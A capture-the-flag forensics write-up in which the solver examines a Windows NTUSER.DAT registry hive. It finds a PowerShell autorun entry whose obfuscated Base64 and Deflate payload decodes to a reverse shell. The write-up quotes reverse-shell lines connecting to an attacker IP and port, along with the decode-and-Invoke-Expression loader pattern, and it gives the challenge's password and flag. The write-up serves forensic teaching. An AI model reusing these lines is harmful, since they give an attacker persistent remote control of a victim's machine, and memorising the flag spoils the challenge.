### TITLE
>Sổ đăng ký
### DESCRIPTION
>Hòa thấy hiện tượng lạ mỗi khi anh ta khởi động máy tính. Anh ta nghĩ rằng việc tải các video không lành mạnh gần đây đã khiến máy tính của anh ta bị hack.

>Tải challenge: https://drive.google.com/file/d/1pShye_YtnUuIObPdnq9PeiIge0Oelsix/view?usp=drive_link (pass: cookiehanhoan)

>Format Flag: CHH{XXX}
### CATEGORY
>Forensics
### HINT
>None
### DIFFICULTY
>easy
### Pass
>cookiehanhoan
### Tool
>[RegRipper](https://github.com/keydet89/RegRipper3.0)
### FLAG
>CHH{N0_4_go_n0_st4r_wh3r3}
### SOLVED
So download the zip file and you get the NTUSER.DAT file. Do a little research and you will find out that it stores user profile settings from the Windows registry. 
![image](https://github.com/user-attachments/assets/5214804f-eb55-499e-95f5-52c78d4c1004)

 Continue to use the __regRipper__ to extract forensic artifacts from Windows Registry hives to a report.txt file. After that take a look at the report and I stumbled upon the powershell.exe that being set autorun with a sus obfuscation script. A brief analysis of the script: This PowerShell script is obfuscated something that extracts, decompresses, and executes hidden code.

![image](https://github.com/user-attachments/assets/3bc88a07-83d0-4763-8bc5-a87544198746)

+ __[coNVeRT]::FRoMBAse64stRInG('<Long Base64 string>')__: Extracts hidden malicious code from the Base64-encoded string.
+ __neW-obJEct io.COMprEssIon.dEFlATesTReAm( [sySTem.IO.memorYSTREam] <Base64DecodedData>, [SYSTEM.iO.ComPReSSion.CoMPrEsSIonmODe]::DeCOmpresS)__: Decompresses the extracted binary using Deflate compression.
+ ___FOREAcH-object{ neW-obJEct io.streAMrEadeR( $_,[sysTem.TExt.EnCoDING]::asCIi )}).reaDToEnD()__: Reads the decoded PowerShell script into a string.
+ __|inVOKe-exprEsSIon__: Executes it with Invoke-Expression, likely running malware.

So our attention is the Base64 string so I use Powershell to decode it and write the result to __output.txt__ (__decode.txt__). Unsurprisingly, it is a __reverse shell__ script that print out the flag, read the script and you will get the flag!!

P/S: Analyze the reverse shell:
+ __$client = New-Object System.Net.Sockets.TCPClient("192.168.253.27",4953);__: Creates a TCP connection to 192.168.253.27:4953. Attacker machine!!
+ __while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){__: Loops indefinitely to receive data from the attacker's machine.
+ __$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);__: Converts received bytes into a command string.
+ __$sendback2 = $sendback + "<Flag>" + (pwd).Path + "> ";__: Appends a flag to the output 
+ __$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);__: Converts output to ASCII bytes for transmission.
+ __$stream.Write($sendbyte,0,$sendbyte.Length);__: Sends the command output back to the attacker's machine.
#### END!!
